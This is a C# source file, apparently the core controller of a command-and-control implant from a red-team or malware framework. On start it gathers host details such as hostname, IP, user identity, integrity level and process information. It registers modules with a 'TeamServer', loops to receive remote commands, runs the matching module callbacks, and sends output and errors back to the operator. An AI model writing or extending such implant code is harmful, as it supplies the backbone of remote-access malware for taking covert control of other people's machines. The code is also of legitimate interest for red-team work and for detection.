using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

class AgentController
{
    AgentStatus AgentStatus;

    ConfigController Config;
    CryptoController Crypto;
    ICommModule CommModule;

    public AgentMetadata AgentMetadata { get; private set; }
    public List<AgentModuleInfo> AgentModules { get; private set; } = new List<AgentModuleInfo>();

    public delegate void OnAgentCommand(byte[] data);
    
    public AgentController(ConfigController config, CryptoController crypto, ICommModule commModule)
    {
        AgentStatus = AgentStatus.Starting;

        Config = config;
        Crypto = crypto;
        CommModule = commModule;
    }

    public void Init(string agentID)
    {
        AgentMetadata = new AgentMetadata
        {
            AgentID = agentID,
            Hostname = Helpers.GetHostname,
            IPAddress = Helpers.GetIpAddress,
            Integrity = Helpers.GetIntegrity,
            Identity = Helpers.GetIdentity,
            ProcessName = Helpers.GetProcessName,
            ProcessID = Helpers.GetProcessId,
            Arch = Helpers.GetArch,
            CLR = Helpers.GetCLRVersion
        };
    }

    public void RegisterAgentModule(IAgentModule module)
    {
        module.Init(this, Config);

        var info = module.GetModuleInfo();

        AgentModules.Add(info);

        if (info.NotifyTeamServer)
        {
            SendData(new AgentMessage
            {
                Metadata = AgentMetadata,
                Data = new C2Data { Module = "Core", Command = "RegisterAgentModule", Data = Serialisation.SerialiseData(info) }
            });
        }
    }

    public void Start()
    {
        AgentStatus = AgentStatus.Running;

        CommModule.SetMetadata(AgentMetadata);
        CommModule.Start();

        while (AgentStatus == AgentStatus.Running)
        {
            if (CommModule.RecvData(out AgentMessage message))
            {
                HandleMessage(message);
            }
        }
    }

    public void Stop()
    {
        AgentStatus = AgentStatus.Stopped;
    }

    public void SendOutput(string output)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { Module = "Core", Command = "AgentOutput", Data = Encoding.UTF8.GetBytes(output) }
        });
    }

    public void SendModuleData(string module, string command, byte[] data)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { AgentID = AgentMetadata.AgentID, Module = module, Command = command, Data = data }
        });
    }

    public void SendError(string error)
    {
        SendData(new AgentMessage
        {
            IdempotencyKey = Guid.NewGuid().ToString(),
            Metadata = AgentMetadata,
            Data = new C2Data { Module = "Core", Command = "AgentError", Data = Encoding.UTF8.GetBytes(error) }
        });
    }

    private void SendData(AgentMessage message)
    {
        CommModule.SendData(message);
    }

    private void HandleMessage(AgentMessage message)
    {
        if (string.IsNullOrEmpty(message.Data.AgentID) || message.Data.AgentID.Equals(AgentMetadata.AgentID, StringComparison.OrdinalIgnoreCase))    // message is for this agent
        {
            if (!string.IsNullOrEmpty(message.Data.Module))
            {
                try
                {
                    var callBack = AgentModules
                    .Where(m => m.Name.Equals(message.Data.Module, StringComparison.OrdinalIgnoreCase))
                    .Select(m => m.Commands).FirstOrDefault()
                    .Where(c => c.Name.Equals(message.Data.Command, StringComparison.OrdinalIgnoreCase))
                    .Select(c => c.CallBack).FirstOrDefault();

                    callBack?.Invoke(message.Data.Data);
                }
                catch (Exception e)
                {
                    SendError(e.Message);
                }
            }
        }
    }
}